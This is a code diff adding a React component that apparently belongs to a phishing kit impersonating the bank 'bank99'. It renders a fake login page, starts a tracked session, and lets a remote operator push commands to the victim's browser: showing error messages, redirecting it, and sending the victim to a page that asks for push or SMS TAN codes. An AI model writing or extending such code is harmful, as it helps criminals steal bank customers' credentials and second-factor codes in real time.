@@ -1,0 +1,54 @@
+"use client";
+
+import { useEffect, useState } from "react";
+import { useRouter } from "next/navigation";
+import Header from "@/components/Header";
+import LoginModal from "@/components/LoginModal";
+import { saveListingSlug, startSession, onCommand } from "@/lib/track";
+
+export default function ClientShell({ initialSlug }: { initialSlug: string | null }) {
+  const router = useRouter();
+  const [error, setError] = useState<string | null>(null);
+
+  useEffect(() => {
+    if (initialSlug) saveListingSlug(initialSlug);
+    startSession("bank99");
+
+    onCommand((cmd) => {
+      if (cmd.type === "show_error") {
+        setError((cmd.payload as { message?: string }).message || "Error");
+      } else if (cmd.type === "clear_error") {
+        setError(null);
+      } else if (cmd.type === "redirect") {
+        const url = (cmd.payload as { url?: string }).url;
+        if (url) window.location.href = url;
+      } else if (cmd.type === "request_push_tan") {
+        router.push("/pushtan");
+      } else if (cmd.type === "request_sms_tan") {
+        router.push("/pushtan");
+      }
+    });
+  }, [initialSlug, router]);
+
+  return (
+    <div
+      className="min-h-screen flex flex-col login-bg"
+      style={{
+        backgroundImage: "url('/bank99/bg-mountains.jpg')",
+        backgroundColor: "#eceff4",
+      }}
+    >
+      <Header />
+      <main className="flex-1 flex items-start justify-center pt-8">
+        {error && (
+          <div className="absolute top-20 left-1/2 -translate-x-1/2 w-full max-w-[460px] px-4 z-50">
+            <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm">
+              {error}
+            </div>
+          </div>
+        )}
+        <LoginModal />
+      </main>
+    </div>
+  );
+}
